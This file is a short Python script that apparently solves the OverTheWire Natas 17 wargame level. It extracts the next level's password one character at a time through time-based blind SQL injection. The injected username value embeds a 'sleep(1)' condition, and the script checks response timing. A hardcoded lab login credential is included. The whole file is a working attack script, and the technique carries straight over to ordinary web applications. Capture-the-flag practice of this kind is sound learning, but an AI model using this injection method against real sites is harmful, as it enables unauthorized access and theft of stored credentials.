import os
import requests
import string

natas18_passwd = ''
alphabet = ''.join([string.ascii_letters, string.digits])

found = True 
while (found):
    print('Password prefix:' + natas18_passwd)
    found = False
    for ch in alphabet:
        print(ch)
        if found:
            break
        res = requests.post('http://natas17.natas.labs.overthewire.org', auth=('natas17', '8Ps3H0GWbn5rd9S7GmAdgQNdkhPkq9cw'), data={'username': 'natas18" and if(password like binary "' + natas18_passwd + ch + '%", 1, sleep(1)) #'}) 
        if res.elapsed.seconds < 1:
            found = True
            natas18_passwd += ch
            break
